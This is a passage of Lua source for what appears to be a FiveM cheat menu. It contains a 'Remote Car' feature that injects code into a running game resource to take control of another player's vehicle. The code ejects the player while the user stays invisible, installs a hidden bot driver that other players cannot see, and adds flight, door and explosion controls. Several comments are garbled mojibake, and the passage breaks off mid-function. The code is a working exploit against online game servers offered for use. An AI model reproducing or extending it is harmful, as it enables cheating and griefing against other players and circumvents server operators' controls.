    -- CallbackEnabled: This code runs when the checkbox is selected (enabling remote control)
    function()
        local selectedPlayer = MachoMenuGetSelectedPlayer()
        
        if selectedPlayer and selectedPlayer ~= -1 then
            local targetPed = GetPlayerPed(selectedPlayer)
            
            if targetPed and DoesEntityExist(targetPed) then
                local targetVehicle = GetVehiclePedIsIn(targetPed, false)
                
                if targetVehicle ~= 0 then
                    local playerPed = PlayerPedId()
                    ClearPedTasksImmediately(playerPed)

                    local originalPos = GetEntityCoords(playerPed)
                    local originalHeading = GetEntityHeading(playerPed)

                    local targetResource = nil
                    local resourcePriority = {"any", "any", "any"}
                    local foundResources = {}
                    for _, resourceName in ipairs(resourcePriority) do
                        if GetResourceState(resourceName) == "started" then
                            table.insert(foundResources, resourceName)
                        end
                    end
                    
                    if #foundResources > 0 then
                        targetResource = foundResources[math.random(1, #foundResources)]
                    else
                        local allResources = {}
                        for i = 0, GetNumResources() - 1 do
                            local resourceName = GetResourceByFindIndex(i)
                            if resourceName and GetResourceState(resourceName) == "started" then
                                table.insert(allResources, resourceName)
                            end
                        end
                        if #allResources > 0 then
                            targetResource = allResources[math.random(1, #allResources)]
                        end
                    end

                    if targetResource then
                        -- Create the help menu (DUI) on the local player's machine.
                        if not GetCurrentResourceName then
                            return
                        end
                        
                        menuDUI = MachoCreateDui(HELP_URL)
                        if not menuDUI then
                            MachoMenuNotification("Remote Car", "Failed to create help menu.")
                            return
                        end
                        Citizen.Wait(1000)
                        MachoShowDui(menuDUI)
                        menuVisible = true
                        
                        -- Loop to handle showing/hiding the menu.
                        Citizen.CreateThread(function()
                            while menuDUI do
                                Citizen.Wait(0)
                                if IsControlJustPressed(0, 167) then -- You can change the open button
                                    menuVisible = not menuVisible
                                    if menuVisible then
                                        MachoShowDui(menuDUI)
                                    else
                                        MachoHideDui(menuDUI)
                                    end
                                end
                            end
                        end)
                        
                        -- Inject the remote control logic into the target resource.
                        MachoInjectResource("any", [[
                        Citizen.CreateThread(function()
                            local playerPed = PlayerPedId()
                            local targetPed = GetPlayerPed(]] .. selectedPlayer .. [[)
                            local targetVehicle = GetVehiclePedIsIn(targetPed, false)
                            local originalPos = vector3(]] .. originalPos.x .. [[, ]] .. originalPos.y .. [[, ]] .. originalPos.z .. [[)
                            local originalHeading = ]] .. originalHeading .. [[

                            if targetVehicle ~= 0 then
                                SetVehicleDoorsLocked(targetVehicle, 1)
                                SetVehicleDoorsLockedForAllPlayers(targetVehicle, false)

                                SetEntityVisible(playerPed, false, false)

                                TaskLeaveVehicle(targetPed, targetVehicle, 0)

                                SetPedMoveRateOverride(playerPed, 10.0)

                                ClearPedTasks(playerPed)
                                SetVehicleForwardSpeed(targetVehicle, 0.0)

                                TaskEnterVehicle(playerPed, targetVehicle, 50, -1, 2.0, 8, 0)

                                -- Ø¥Ø¶Ø§ÙØ© Ø­Ù„Ù‚Ø© Ø§Ù†ØªØ¸Ø§Ø± Ù„Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ø§Ù„ØªØ­ÙƒÙ… Ø¨Ø§Ù„Ù…Ø±ÙƒØ¨Ø©
                                local hasControl = false
                                local timeout = 0
                                while not hasControl and timeout < 200 do
                                    Citizen.Wait(10)
                                    if NetworkHasControlOfEntity(targetVehicle) then
                                        hasControl = true
                                    else
                                        NetworkRequestControlOfEntity(targetVehicle)
                                    end
                                    timeout = timeout + 1
                                end

                                if not hasControl then
                                    MachoMenuNotification("Remote Car", "Failed to get control of the vehicle. Aborting.")
                                    SetEntityVisible(playerPed, true, false)
                                    return
                                end
                                
                                -- â­ï¸ Ø¥Ø¶Ø§ÙØ© ÙØªØ±Ø© Ø§Ù†ØªØ¸Ø§Ø± Ù…Ø¯ØªÙ‡Ø§ Ø«Ø§Ù†ÙŠØªØ§Ù† Ø¨Ø¹Ø¯ Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ø§Ù„ØµÙ„Ø§Ø­ÙŠØ© â­ï¸
                                Citizen.Wait(600)

                                local keepHidden = true
                                Citizen.CreateThread(function()
                                    while keepHidden do
                                        SetEntityVisible(playerPed, false, false)
                                        Citizen.Wait(10)
                                    end
                                end)

                                Citizen.Wait(500)
                                keepHidden = false

                                ClearPedTasksImmediately(playerPed)

                                SetEntityAsMissionEntity(playerPed, true, true)

                                SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                                SetEntityHeading(playerPed, originalHeading)

                                for i = 1, 50 do
                                    SetEntityVisible(playerPed, false, false)
                                    Citizen.Wait(10)
                                end

                                Citizen.Wait(100)

                                ClearPedTasksImmediately(playerPed)

                                SetPedMoveRateOverride(playerPed, 1.0)
                                SetEntityVelocity(playerPed, 0.1, 0.1, 0.0)
                                TaskWanderStandard(playerPed, 0.0, 0)
                                Citizen.Wait(100)
                                ClearPedTasksImmediately(playerPed)

                                SetEntityVisible(playerPed, false, false)

                                Citizen.Wait(100)

                                ClearPedTasksImmediately(playerPed)
                                SetPedMoveRateOverride(playerPed, 1.0)
                                SetEntityAsMissionEntity(playerPed, false, false)

                                SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                                SetEntityHeading(playerPed, originalHeading)

                                Citizen.Wait(100)

                                TaskGoStraightToCoord(playerPed, originalPos.x + 0.5, originalPos.y + 0.5, originalPos.z, 1.0, 500, originalHeading, 0.1)

                                Citizen.Wait(600)

                                ClearPedTasks(playerPed)

                                -- Ø¨Ø¯Ø¡ Ù†Ø¸Ø§Ù… Remote Car Ø§Ù„ÙƒØ§Ù…Ù„
                                if DoesEntityExist(targetVehicle) then
                                    local RemoteCar = {}
                                    local isSpectating = false
                                    local originalPlayerPed = nil
                                    local audioEnabled = true
                                    local originalAudioPos = nil
                                    local isFlying = false
                                    local flightSpeed = 25.0
                                    local flightAcceleration = 0.2
                                    local isHonking = false
                                    local originalLightState = 0

                                    RemoteCar.Start = function()
                                        local selectedVehicle = targetVehicle
                                        if not selectedVehicle or not DoesEntityExist(selectedVehicle) then
                                            return
                                        end
                                        RemoteCar.Entity = selectedVehicle
                                        RemoteCar.OriginalPed = PlayerPedId()
                                        originalAudioPos = GetEntityCoords(RemoteCar.OriginalPed)
                                        originalLightState = GetVehicleLightsState(RemoteCar.Entity) and 2 or 0
                                        local success = pcall(function()
                                            RemoteCar.CreateBotDriver()
                                        end)
                                        if not success then
                                            return
                                        end
                                        RemoteCar.StartSpectate()
                                        RemoteCar.SetupAudioSystem()
                                        Citizen.CreateThread(function()
                                            while RemoteCar.Entity and DoesEntityExist(RemoteCar.Entity) and RemoteCar.BotPed and DoesEntityExist(RemoteCar.BotPed) do
                                                Citizen.Wait(0)
                                                pcall(function()
                                                    RemoteCar.UpdateAudioPosition()
                                                end)
                                                if isSpectating then
                                                    DisableControlAction(0, 30, true)
                                                    DisableControlAction(0, 31, true)
                                                    DisableControlAction(0, 21, true)
                                                    DisableControlAction(0, 22, true)
                                                    DisableControlAction(0, 44, true)
                                                    DisableControlAction(0, 55, true)
                                                    DisableControlAction(0, 76, true)
                                                    DisableControlAction(0, 23, true)
                                                    DisableControlAction(0, 75, true)
                                                    DisableControlAction(0, 101, true)
                                                    DisableControlAction(0, 102, true)
                                                    DisableControlAction(0, 26, true)
                                                    DisableControlAction(0, 0, true)
                                                    DisableControlAction(0, 140, true)
                                                    DisableControlAction(0, 141, true)
                                                    DisableControlAction(0, 142, true)
                                                    DisableControlAction(0, 143, true)
                                                    DisableControlAction(0, 263, true)
                                                    DisableControlAction(0, 264, true)
                                                    DisableControlAction(0, 24, true)
                                                    DisableControlAction(0, 25, true)
                                                    EnableControlAction(0, 172, true)
                                                    EnableControlAction(0, 173, true)
                                                    EnableControlAction(0, 174, true)
                                                    EnableControlAction(0, 175, true)
                                                    EnableControlAction(0, 32, true)
                                                    EnableControlAction(0, 33, true)
                                                    EnableControlAction(0, 34, true)
                                                    EnableControlAction(0, 35, true)
                                                    EnableControlAction(0, 22, true)
                                                    EnableControlAction(0, 21, true)
                                                    EnableControlAction(0, 47, true)
                                                    EnableControlAction(0, 73, true)
                                                    EnableControlAction(0, 246, true)
                                                    EnableControlAction(0, 44, true)
                                                    EnableControlAction(0, 48, true)
                                                    EnableControlAction(0, 108, true)
                                                    EnableControlAction(0, 23, true)
                                                    EnableControlAction(0, 51, true)
                                                end
                                                if RemoteCar.OriginalPed and DoesEntityExist(RemoteCar.OriginalPed) then
                                                    local distance = GetDistanceBetweenCoords(
                                                        GetEntityCoords(RemoteCar.OriginalPed),
                                                        GetEntityCoords(RemoteCar.Entity),
                                                        true
                                                    )
                                                    pcall(function()
                                                        RemoteCar.HandleKeys(distance)
                                                    end)
                                                    local vehicleCoords = GetEntityCoords(RemoteCar.Entity)
                                                    if vehicleCoords then
                                                        SetFocusPosAndVel(vehicleCoords.x, vehicleCoords.y, vehicleCoords.z, 0.0, 0.0, 0.0)
                                                    end
                                                    if distance <= 2000.0 then
                                                        if not NetworkHasControlOfEntity(RemoteCar.BotPed) then
                                                            NetworkRequestControlOfEntity(RemoteCar.BotPed)
                                                        end
                                                        if not NetworkHasControlOfEntity(RemoteCar.Entity) then
                                                            NetworkRequestControlOfEntity(RemoteCar.Entity)
                                                        end
                                                    else
                                                        pcall(function()
                                                            TaskVehicleTempAction(RemoteCar.BotPed, RemoteCar.Entity, 6, 2500)
                                                        end)
                                                    end
                                                else
                                                    break
                                                end
                                            end
                                            pcall(function()
                                                RemoteCar.Stop()
                                                ClearFocus()
                                            end)
                                        end)
                                    end

                                    RemoteCar.SetupAudioSystem = function()
                                        audioEnabled = true
                                        Citizen.CreateThread(function()
                                            while RemoteCar.Entity and DoesEntityExist(RemoteCar.Entity) do
                                                Citizen.Wait(100)
                                                pcall(function()
                                                    RemoteCar.UpdateAudioPosition()
                                                end)
                                            end
                                        end)
                                    end

                                    RemoteCar.UpdateAudioPosition = function()
                                        if not RemoteCar.Entity or not DoesEntityExist(RemoteCar.Entity) then
                                            return
                                        end
                                        pcall(function()
                                            local vehicleCoords = GetEntityCoords(RemoteCar.Entity)
                                            SetAudioListenerPosition(vehicleCoords.x, vehicleCoords.y, vehicleCoords.z)
                                            local velocity = GetEntityVelocity(RemoteCar.Entity)
                                            SetAudioListenerVelocity(velocity.x, velocity.y, velocity.z)
                                            local heading = GetEntityHeading(RemoteCar.Entity)
                                            local radHeading = math.rad(heading)
                                            local forwardX = -math.sin(radHeading)
                                            local forwardY = math.cos(radHeading)
                                            SetAudioListenerOrientation(forwardX, forwardY, 0.0, 0.0, 0.0, 1.0)
                                            SetAudioFlag("AudioListenerEnabled", true)
                                            SetAudioFlag("LoadMPData", true)
                                            SetAudioFlag("DisableFlightMusic", true)
                                            SetAudioFlag("PauseBeatRepeats", false)
                                        end)
                                    end

                                    RemoteCar.ToggleAudio = function()
                                        audioEnabled = not audioEnabled
                                        if audioEnabled then
                                            pcall(function()
                                                RemoteCar.UpdateAudioPosition()
                                            end)
                                            MachoMenuNotification("Remote Car", "Audio enabled - hearing from vehicle position")
                                        else
                                            pcall(function()
                                                if RemoteCar.OriginalPed and DoesEntityExist(RemoteCar.OriginalPed) then
                                                    local playerCoords = GetEntityCoords(RemoteCar.OriginalPed)
                                                    SetAudioListenerPosition(playerCoords.x, playerCoords.y, playerCoords.z)
                                                    local playerVelocity = GetEntityVelocity(RemoteCar.OriginalPed)
                                                    SetAudioListenerVelocity(playerVelocity.x, playerVelocity.y, playerVelocity.z)
                                                    local playerHeading = GetEntityHeading(RemoteCar.OriginalPed)
                                                    local radHeading = math.rad(playerHeading)
                                                    local forwardX = -math.sin(radHeading)
                                                    local forwardY = math.cos(radHeading)
                                                    SetAudioListenerOrientation(forwardX, forwardY, 0.0, 0.0, 0.0, 1.0)
                                                end
                                            end)
                                            MachoMenuNotification("Remote Car", "Audio disabled - returned to normal audio")
                                        end
                                    end

                                    RemoteCar.RestoreOriginalAudio = function()
                                        pcall(function()
                                            SetAudioFlag("AudioListenerEnabled", false)
                                            ClearAudioFlags()
                                            if RemoteCar.OriginalPed and DoesEntityExist(RemoteCar.OriginalPed) then
                                                local playerCoords = GetEntityCoords(RemoteCar.OriginalPed)
                                                SetAudioListenerPosition(playerCoords.x, playerCoords.y, playerCoords.z)
                                                SetAudioListenerVelocity(0.0, 0.0, 0.0)
                                                SetAudioListenerOrientation(0.0, 1.0, 0.0, 0.0, 0.0, 1.0)
                                            end
                                        end)
                                    end

                                    RemoteCar.CreateBotDriver = function()
                                        if not RemoteCar.Entity or not DoesEntityExist(RemoteCar.Entity) then
                                            return
                                        end
                                        RemoteCar.OriginalPed = PlayerPedId()

                                        pcall(function()
                                            local existingDriver = GetPedInVehicleSeat(RemoteCar.Entity, -1)
                                            if existingDriver and existingDriver ~= 0 and existingDriver ~= RemoteCar.OriginalPed then
                                                if not IsPedAPlayer(existingDriver) then
                                                    SetEntityAsMissionEntity(existingDriver, false, false)
                                                    DeleteEntity(existingDriver)
                                                else
                                                    TaskLeaveVehicle(existingDriver, RemoteCar.Entity, 0)
                                                end
                                            end
                                            for seat = 0, GetVehicleMaxNumberOfPassengers(RemoteCar.Entity) - 1 do
                                                local passenger = GetPedInVehicleSeat(RemoteCar.Entity, seat)
                                                if passenger and passenger ~= 0 and not IsPedAPlayer(passenger) then
                                                    SetEntityAsMissionEntity(passenger, false, false)
                                                    DeleteEntity(passenger)
                                                end
                                            end
                                        end)

                                        if not DoesEntityExist(RemoteCar.Entity) then
                                            return
                                        end

                                        local modelHash = GetHashKey("mp_m_freemode_01")

                                        RequestModel(modelHash)
                                        local timeout = 0
                                        while not HasModelLoaded(modelHash) and timeout < 20 do
                                            Citizen.Wait(10)
                                            timeout = timeout + 1
                                        end

                                        if not HasModelLoaded(modelHash) or not DoesEntityExist(RemoteCar.Entity) then
                                            return
                                        end

                                        -- Ø¥Ù†Ø´Ø§Ø¡ Ø§Ù„Ø¨ÙˆØª Ø¨Ø·Ø±ÙŠÙ‚Ø© client side ÙÙ‚Ø·
                                        local coords = GetEntityCoords(RemoteCar.Entity)
                                        local heading = GetEntityHeading(RemoteCar.Entity)

                                        local success, botPed = pcall(function()
                                            return CreatePed(5, modelHash, coords.x, coords.y, coords.z, heading, false, false)
                                        end)

                                        if not success or not botPed or botPed == 0 then
                                            return
                                        end

                                        RemoteCar.BotPed = botPed

                                        pcall(function()
                                            -- Ø¬Ø¹Ù„ Ø§Ù„Ø¨ÙˆØª client side ÙÙ‚Ø·
                                            SetEntityAsMissionEntity(RemoteCar.BotPed, true, true)
                                            SetEntityInvincible(RemoteCar.BotPed, true)
                                            SetEntityVisible(RemoteCar.BotPed, true)
                                            SetPedAlertness(RemoteCar.BotPed, 0)
                                            SetPedCanRagdoll(RemoteCar.BotPed, false)
                                            SetPedCanBeTargetted(RemoteCar.BotPed, false)
                                            SetPedCanBeDraggedOut(RemoteCar.BotPed, false)

                                            -- Ø¥Ø®ÙØ§Ø¡ Ø§Ù„Ø¨ÙˆØª Ø¹Ù† Ø§Ù„Ù„Ø§Ø¹Ø¨ÙŠÙ† Ø§Ù„Ø¢Ø®Ø±ÙŠÙ†
                                            SetEntityVisible(RemoteCar.BotPed, false, false)

                                            -- Thread Ù…Ù†ÙØµÙ„ Ù„Ø¥Ø¸Ù‡Ø§Ø± Ø§Ù„Ø¨ÙˆØª Ù…Ø­Ù„ÙŠØ§Ù‹ ÙÙ‚Ø·
                                            Citizen.CreateThread(function()
                                                while RemoteCar.BotPed and DoesEntityExist(RemoteCar.BotPed) do
                                                    Citizen.Wait(100)
                                                    -- Ø¥Ø¸Ù‡Ø§Ø± Ø§Ù„Ø¨ÙˆØª Ù„Ù„Ø§Ø¹Ø¨ Ø§Ù„Ø­Ø§Ù„ÙŠ ÙÙ‚Ø·
                                                    SetEntityAlpha(RemoteCar.BotPed, 255, false)
                                                    SetEntityVisible(RemoteCar.BotPed, true, false)
                                                    -- Ù…Ù†Ø¹ Ø±Ø¤ÙŠØ© Ø§Ù„Ø¢Ø®Ø±ÙŠÙ† Ù„Ù„Ø¨ÙˆØª
                                                    for i = 0, 255 do
                                                        if i ~= PlayerId() and NetworkIsPlayerActive(i) then
                                                            SetEntityVisibleToPlayer(i, RemoteCar.BotPed, false)
                                                        end
                                                    end
                                                end
                                            end)
                                        end)

                                        -- Ø¥Ø¯Ø®Ø§Ù„ Ø§Ù„Ø¨ÙˆØª Ù„Ù„Ø³ÙŠØ§Ø±Ø©
                                        local enterTimeout = 0
                                        while not IsPedInVehicle(RemoteCar.BotPed, RemoteCar.Entity) and enterTimeout < 5 and DoesEntityExist(RemoteCar.Entity) do
                                            Citizen.Wait(20)
                                            enterTimeout = enterTimeout + 1
                                            TaskWarpPedIntoVehicle(RemoteCar.BotPed, RemoteCar.Entity, -1)
                                        end
                                    end

                                    RemoteCar.StartSpectate = function()
                                        if not RemoteCar.BotPed or not DoesEntityExist(RemoteCar.BotPed) then
                                            return
                                        end
                                        if DoesCamExist(RemoteCar.SpectateCamera) then
                                            DestroyCam(RemoteCar.SpectateCamera)
                                        end
                                        local success, camera = pcall(function()
                                            return CreateCam("DEFAULT_SCRIPTED_CAMERA", true)
                                        end)
                                        if not success or not camera then
                                            return
                                        end
                                        RemoteCar.SpectateCamera = camera
                                        SetCamFov(RemoteCar.SpectateCamera, 75.0)
                                        RemoteCar.CameraDistance = 8.0
                                        RemoteCar.CameraHeight = 3.0
                                        RemoteCar.CameraAngleHorizontal = 0.0
                                        RemoteCar.CameraAngleVertical = -10.0
                                        isSpectating = true
                                        RenderScriptCams(1, 0, 0, 1, 1)
                                        Citizen.CreateThread(function()
                                            while isSpectating and RemoteCar.BotPed and DoesEntityExist(RemoteCar.BotPed) do
                                                Citizen.Wait(0)
                                                pcall(function()
                                                    if IsPedInAnyVehicle(RemoteCar.BotPed, false) then
                                                        local vehicle = GetVehiclePedIsIn(RemoteCar.BotPed, false)
                                                        if vehicle and DoesEntityExist(vehicle) then
                                                            local vehicleCoords = GetEntityCoords(vehicle)
                                                            local mouseX = GetDisabledControlNormal(0, 1) * 15.0
                                                            local mouseY = GetDisabledControlNormal(0, 2) * 8.0
                                                            RemoteCar.CameraAngleHorizontal = RemoteCar.CameraAngleHorizontal + mouseX
                                                            RemoteCar.CameraAngleVertical = math.max(-45.0, math.min(45.0, RemoteCar.CameraAngleVertical + mouseY))
                                                            if IsControlPressed(0, 15) then
                                                                RemoteCar.CameraDistance = math.max(3.0, RemoteCar.CameraDistance - 0.5)
                                                            elseif IsControlPressed(0, 16) then
                                                                RemoteCar.CameraDistance = math.min(15.0, RemoteCar.CameraDistance + 0.5)
                                                            end
                                                            local radianHorizontal = math.rad(RemoteCar.CameraAngleHorizontal)
                                                            local radianVertical = math.rad(RemoteCar.CameraAngleVertical)
                                                            local offsetX = math.sin(radianHorizontal) * RemoteCar.CameraDistance * math.cos(radianVertical)
                                                            local offsetY = math.cos(radianHorizontal) * RemoteCar.CameraDistance * math.cos(radianVertical)
                                                            local offsetZ = math.sin(radianVertical) * RemoteCar.CameraDistance
                                                            local cameraPos = vector3(
                                                                vehicleCoords.x + offsetX,
                                                                vehicleCoords.y + offsetY,
                                                                vehicleCoords.z + RemoteCar.CameraHeight + offsetZ
                                                            )
                                                            SetFocusPosAndVel(cameraPos.x, cameraPos.y, cameraPos.z, 0.0, 0.0, 0.0)
                                                            SetCamCoord(RemoteCar.SpectateCamera, cameraPos)
                                                            PointCamAtEntity(RemoteCar.SpectateCamera, vehicle, 0.0, 0.0, 0.0, true)
                                                            DisableControlAction(0, 1, true)
                                                            DisableControlAction(0, 2, true)
                                                            DisableControlAction(0, 15, true)
                                                            DisableControlAction(0, 16, true)
                                                            if IsControlJustPressed(0, 45) then
                                                                RemoteCar.CameraDistance = 8.0
                                                                RemoteCar.CameraHeight = 3.0
                                                                RemoteCar.CameraAngleHorizontal = 0.0
                                                                RemoteCar.CameraAngleVertical = -10.0
                                                            end
                                                            SetTextFont(4)
                                                            SetTextProportional(1)
                                                            SetTextScale(0.0, 0.4)
                                                            SetTextColour(255, 255, 255, 255)
                                                            SetTextEntry("STRING")
                                                            local speed = GetEntitySpeed(vehicle) * 3.6
                                                            local audioStatus = audioEnabled and "ON" or "OFF"
                                                            DrawText(0.02, 0.02)
                                                        end
                                                    end
                                                end)
                                            end
                                        end)
                                    end

                                    RemoteCar.StopSpectate = function()
                                        if isSpectating then
                                            isSpectating = false
                                            pcall(function()
                                                ClearFocus()
                                                if RemoteCar.OriginalPed and DoesEntityExist(RemoteCar.OriginalPed) then
                                                    local playerCoords = GetEntityCoords(RemoteCar.OriginalPed)
                                                    SetFocusPosAndVel(playerCoords.x, playerCoords.y, playerCoords.z, 0.0, 0.0, 0.0)
                                                    ClearFocus()
                                                else
                                                    ClearFocus()
                                                end
                                                RenderScriptCams(0, 0, 0, 1, 0)
                                                if DoesCamExist(RemoteCar.SpectateCamera) then
                                                    DestroyCam(RemoteCar.SpectateCamera)
                                                    RemoteCar.SpectateCamera = nil
                                                end
                                                SetPlayerControl(PlayerId(), true, 0)
                                            end)
                                        end
                                    end

                                    RemoteCar.MakeVehicleExplode = function()
                                        if not RemoteCar.Entity or not DoesEntityExist(RemoteCar.Entity) then
                                            return
                                        end
                                        pcall(function()
                                            ExplodeVehicleInCutscene(RemoteCar.Entity, true)
                                        end)
                                    end

                                    RemoteCar.HandleHonking = function()
                                        if IsControlPressed(0, 51) then
                                            if not isHonking then
                                                isHonking = true
                                                pcall(function()
                                                    SetVehicleDoorOpen(RemoteCar.Entity, 0, false, false)
                                                    SetVehicleDoorOpen(RemoteCar.Entity, 1, false, false)
                                                    SetVehicleDoorOpen(RemoteCar.Entity, 2, false, false)
                                                    SetVehicleDoorOpen(RemoteCar.Entity, 3, false, false)
                                                    SetVehicleDoorOpen(RemoteCar.Entity, 4, false, false)
                                                    SetVehicleDoorOpen(RemoteCar.Entity, 5, false, false)
                                                    SetVehicleDoorOpen(RemoteCar.Entity, 6, false, false)
                                                    SetVehicleDoorOpen(RemoteCar.Entity, 7, false, false)
                                                end)
                                            end
                                        else
                                            if isHonking then
                                                isHonking = false
                                                pcall(function()
                                                    if RemoteCar.Entity and DoesEntityExist(RemoteCar.Entity) then
                                                        for i = 0, 7 do
                                                            SetVehicleDoorShut(RemoteCar.Entity, i, false)
                                                        end
                                                    end
                                                end)
                                            end
                                        end
                                    end

                                    RemoteCar.HandleKeys = function(distance)
                                        if IsControlJustReleased(0, 23) then
                                            isFlying = not isFlying
                                            pcall(function()
                                                if isFlying then
                                                    SetVehicleGravity(RemoteCar.Entity, false)
                                                    SetEntityCollision(RemoteCar.Entity, false, false)
                                                    SetEntityCollision(RemoteCar.BotPed, false, false)
                                                    SetEntityRotation(RemoteCar.Entity, 0.0, 0.0, GetEntityHeading(RemoteCar.Entity), 2, true)
                                                    SetEntityDynamic(RemoteCar.Entity, false)
                                                    SetEntityDynamic(RemoteCar.BotPed, false)
                                                else
                                                    SetVehicleGravity(RemoteCar.Entity, true)
                                                    SetEntityCollision(RemoteCar.Entity, true, true)
                                                    SetEntityCollision(RemoteCar.BotPed, true, true)
                                                    local coords = GetEntityCoords(RemoteCar.Entity)
                                                    SetEntityCoordsNoOffset(RemoteCar.Entity, coords.x, coords.y, coords.z, false, false, false)
                                                    PlaceObjectOnGroundProperly(RemoteCar.Entity)
                                                    SetEntityDynamic(RemoteCar.Entity, true)
                                                    SetEntityDynamic(RemoteCar.BotPed, true)
                                                end
                                            end)
                                        end
                                        if IsControlJustReleased(0, 47) then
                                            if isSpectating then
                                                RemoteCar.StopSpectate()
                                            else
                                                RemoteCar.StartSpectate()
                                            end
                                        end
                                        if IsControlJustPressed(0, 45) then
                                            pcall(function()
                                                if RemoteCar.Entity and DoesEntityExist(RemoteCar.Entity) then
                                                    SetVehicleFixed(RemoteCar.Entity)
                                                    SetVehicleDeformationFixed(RemoteCar.Entity)
                                                    SetVehicleUndriveable(RemoteCar.Entity, false)
                                                    SetVehicleEngineOn(RemoteCar.Entity, true, true, false)
                                                    StopEntityFire(RemoteCar.Entity)
                                                    local coords = GetEntityCoords(RemoteCar.Entity)
                                                    local heading = GetEntityHeading(RemoteCar.Entity)
                                                    SetEntityCoordsNoOffset(RemoteCar.Entity, coords.x, coords.y, coords.z + 1.0, false, false, false)
                                                    SetEntityRotation(RemoteCar.Entity, 0.0, 0.0, heading, 2, true)
                                                    if not isFlying then
                                                        PlaceObjectOnGroundProperly(RemoteCar.Entity)
                                                    end

                                                    if RemoteCar.BotPed and DoesEntityExist(RemoteCar.BotPed) then
                                                        DeleteEntity(RemoteCar.BotPed)
                                                    end

                                                    local modelHash = GetHashKey("mp_m_freemode_01")
                                                    if not HasModelLoaded(modelHash) then
                                                        RequestModel(modelHash)
                                                        while not HasModelLoaded(modelHash) do
                                                            Citizen.Wait(10)
                                                        end
                                                    end

                                                    -- Ø¥Ø¹Ø§Ø¯Ø© Ø¥Ù†Ø´Ø§Ø¡ Ø§Ù„Ø¨ÙˆØª ÙƒÙ€ client-side Ø¨Ø§Ù„ÙƒØ§Ù…Ù„
                                                    RemoteCar.BotPed = CreatePedInsideVehicle(RemoteCar.Entity, 5, modelHash, -1, false, false)
                                                    SetEntityAsMissionEntity(RemoteCar.BotPed, true, true)
                                                    SetEntityInvincible(RemoteCar.BotPed, true)
                                                    SetPedAlertness(RemoteCar.BotPed, 0)
                                                    SetPedCanRagdoll(RemoteCar.BotPed, false)
                                                    SetPedCanBeTargetted(RemoteCar.BotPed, false)
                                                    SetPedCanBeDraggedOut(RemoteCar.BotPed, false)
                                                    SetEntityVisible(RemoteCar.BotPed, false, false) -- Ø¥Ø®ÙØ§Ø¡ Ø§Ù„Ø¨ÙˆØª Ø¹Ù† Ø§Ù„Ø¬Ù…ÙŠØ¹

                                                    -- Thread Ù…Ù†ÙØµÙ„ Ù„Ø¥Ø¸Ù‡Ø§Ø± Ø§Ù„Ø¨ÙˆØª Ù…Ø­Ù„ÙŠØ§Ù‹ ÙÙ‚Ø·
                                                    Citizen.CreateThread(function()
                                                        while RemoteCar.BotPed and DoesEntityExist(RemoteCar.BotPed) do
                                                            Citizen.Wait(100)
                                                            -- Ø¥Ø¸Ù‡Ø§Ø± Ø§Ù„Ø¨ÙˆØª Ù„Ù„Ø§Ø¹Ø¨ Ø§Ù„Ø­Ø§Ù„ÙŠ ÙÙ‚Ø·
                                                            SetEntityAlpha(RemoteCar.BotPed, 255, false)
                                                            SetEntityVisible(RemoteCar.BotPed, true, false)
                                                            -- Ù…Ù†Ø¹ Ø±Ø¤ÙŠØ© Ø§Ù„Ø¢Ø®Ø±ÙŠÙ† Ù„Ù„Ø¨ÙˆØª
                                                            for i = 0, 255 do
                                                                if i ~= PlayerId() and NetworkIsPlayerActive(i) then
                                                                    SetEntityVisibleToPlayer(i, RemoteCar.BotPed, false)
                                                                end
                                                            end
                                                        end
                                                    end)

                                                    if isSpectating and RemoteCar.SpectateCamera and DoesCamExist(RemoteCar.SpectateCamera) then
                                                        RemoteCar.CameraDistance = 8.0
                                                        RemoteCar.CameraHeight = 3.0
                                                        RemoteCar.CameraAngleHorizontal = 0.0
                                                        RemoteCar.CameraAngleVertical = -10.0

                                                        local vehicleCoords = GetEntityCoords(RemoteCar.Entity)
                                                        local cameraPos = vector3(
                                                            vehicleCoords.x,
                                                            vehicleCoords.y - 8.0,
                                                            vehicleCoords.z + 3.0
                                                        )
                                                        SetCamCoord(RemoteCar.SpectateCamera, cameraPos)
                                                        PointCamAtEntity(RemoteCar.SpectateCamera, RemoteCar.Entity, 0.0, 0.0, 0.0, true)
                                                    end
                                                end
                                            end)
                                        end
                                        if IsControlJustPressed(0, 73) then
                                            RemoteCar.Stop()
                                            ClearFocus()
                                            return
                                        end
                                        if RemoteCar.BotPed and DoesEntityExist(RemoteCar.BotPed) then
                                            local vehicleCoords = GetEntityCoords(RemoteCar.Entity)
                                            if vehicleCoords then
                                                SetFocusPosAndVel(vehicleCoords.x, vehicleCoords.y, vehicleCoords.z, 0.0, 0.0, 0.0)
                                            end
                                            pcall(function()
                                                if IsControlJustReleased(0, 26) then
                                                    RemoteCar.MakeVehicleExplode()
                                                end
                                                RemoteCar.HandleHonking()
                                                if isFlying then
                                                    local forward = IsControlPressed(0, 172) or IsControlPressed(0, 32)
                                                    local backward = IsControlPressed(0, 173) or IsControlPressed(0, 33)
                                                    local left = IsControlPressed(0, 174) or IsControlPressed(0, 34)
                                                    local right = IsControlPressed(0, 175) or IsControlPressed(0, 35)
                                                    local up = IsControlPressed(0, 22)
                                                    local down = IsControlPressed(0, 36)
                                                    local boost = IsControlPressed(0, 21)
                                                    local heading = GetEntityHeading(RemoteCar.Entity)
                                                    local radHeading = math.rad(heading)
                                                    local moveX = 0.0
                                                    local moveY = 0.0
                                                    local moveZ = 0.0
                                                    SetVehicleGravity(RemoteCar.Entity, false)
                                                    SetEntityRotation(RemoteCar.Entity, 0.0, 0.0, heading, 2, true)
                                                    if forward then
                                                        moveX = moveX - math.sin(radHeading) * flightSpeed
                                                        moveY = moveY + math.cos(radHeading) * flightSpeed
                                                    end
                                                    if backward then
                                                        moveX = moveX + math.sin(radHeading) * flightSpeed
                                                        moveY = moveY - math.cos(radHeading) * flightSpeed
                                                    end
                                                    if left then
                                                        heading = heading + 3.0
                                                        SetEntityHeading(RemoteCar.Entity, heading)
                                                    end
                                                    if right then
                                                        heading = heading - 3.0
                                                        SetEntityHeading(RemoteCar.Entity, heading)
                                                    end
                                                    if up then
                                                        moveZ = moveZ + flightSpeed
                                                    end
                                                    if down then
                                                        moveZ = moveZ - flightSpeed
                                                    end
                                                    if boost then
                                                        moveX = moveX * 2.0
                                                        moveY = moveY * 2.0
                                                        moveZ = moveZ * 2.0
                                                    end
